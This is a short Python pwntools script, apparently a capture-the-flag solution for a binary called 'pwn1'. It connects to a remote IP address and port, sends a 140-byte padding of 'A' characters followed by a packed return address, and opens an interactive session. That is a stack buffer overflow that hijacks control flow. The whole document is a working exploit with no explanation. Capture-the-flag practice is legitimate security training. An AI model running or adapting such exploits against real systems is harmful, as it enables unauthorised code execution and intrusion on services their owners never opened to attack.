from pwn import *

TARGET = './pwn1'
HOST = '104.154.106.182'
PORT = 2345

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

r.recvuntil('name')

payload = ''
payload += 'A' * 140
payload += p32(0x80484ad)
r.sendline(payload)


r.interactive()
r.close()
